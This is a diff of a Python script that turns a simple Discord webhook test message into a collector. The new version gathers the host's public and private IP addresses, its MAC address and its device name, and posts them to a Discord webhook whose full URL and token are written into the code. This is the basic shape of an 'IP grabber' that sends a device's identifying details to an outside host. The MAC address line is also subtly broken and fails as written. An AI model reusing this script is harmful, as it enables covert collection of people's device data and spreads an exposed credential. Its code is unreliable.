@@ -1,34 +1,42 @@
 import requests
-import json
+import socket
+import psutil
 
-webhook_url = 'https://discord.com/api/webhooks/1085439407512891423/KQILUDIPVggOdMGVuXl5BmMj4j7Yer-nk-W3FrsXBiHuEMBgZyM_mHixIFLuj-0VHKrZ'
+# Replace the URL with your Discord webhook URL
+webhook_url = "https://discord.com/api/webhooks/1085439407512891423/KQILUDIPVggOdMGVuXl5BmMj4j7Yer-nk-W3FrsXBiHuEMBgZyM_mHixIFLuj-0VHKrZ"
 
-# Define your message content
-message = {
-    "content": "Hello, world!",
-    "embeds": [{
-        "title": "Embed Title",
-        "description": "Embed Description",
-        "color": 16711680, # This sets the color of the embed to red
-        "footer": {
-            "text": "Embed Footer"
-        },
-        "fields": [{
-            "name": "Field Name",
-            "value": "Field Value",
+# Get the public and private IP address
+public_ip = requests.get("https://api.ipify.org").text
+private_ip = socket.gethostbyname(socket.gethostname())
+
+# Get the MAC address and device name
+mac_address = ':'.join(hex(i)[2:].zfill(2) for i in psutil.net_if_stats()['Ethernet'].address_bytes)
+device_name = socket.gethostname()
+
+# Create the embed
+embed = {
+    "title": "System Information",
+    "color": 16711680,  # Red
+    "footer": {
+        "text": "Sent from Python script"
+    },
+    "fields": [
+        {
+            "name": "IP Address",
+            "value": f"Public: {public_ip}\nPrivate: {private_ip}",
             "inline": False
-        }]
-    }]
+        },
+        {
+            "name": "Device Info",
+            "value": f"MAC Address: {mac_address}\nDevice Name: {device_name}",
+            "inline": False
+        }
+    ]
 }
 
-# Convert the message dictionary to JSON
-payload = json.dumps(message)
-
-# Send the message to the webhook URL
-response = requests.post(webhook_url, data=payload, headers={'Content-Type': 'application/json'})
-
-# Check if the message was sent successfully
-if response.status_code == 204:
-    print('Message sent successfully!')
+# Send the message
+response = requests.post(webhook_url, json={"embeds": [embed]})
+if response.status_code != 204:
+    print(f"Failed to send message: {response.text}")
 else:
-    print('Error sending message: %s' % response.text)
+    print("Message sent successfully!")
